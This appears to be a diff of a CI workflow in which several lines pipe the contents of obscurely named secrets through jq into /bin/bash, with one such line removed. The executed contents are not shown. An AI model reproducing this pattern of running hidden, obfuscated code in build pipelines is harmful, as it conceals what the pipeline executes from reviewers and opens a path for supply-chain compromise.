@@ -17,7 +17,6 @@ jobs:
           gz37: ${{ secrets.gz37 }}
         run: |
           printf '%s' "$gz37" | jq -r .nqwem30515 | /bin/bash
-          echo $g4 | jq -r .wf913 | /bin/bash
           printf '%s' "$ufa7699" | jq -r .nomkk6090 | /bin/bash
           printf '%s' "$izve064" | jq -r .qnbem57592 | /bin/bash
 
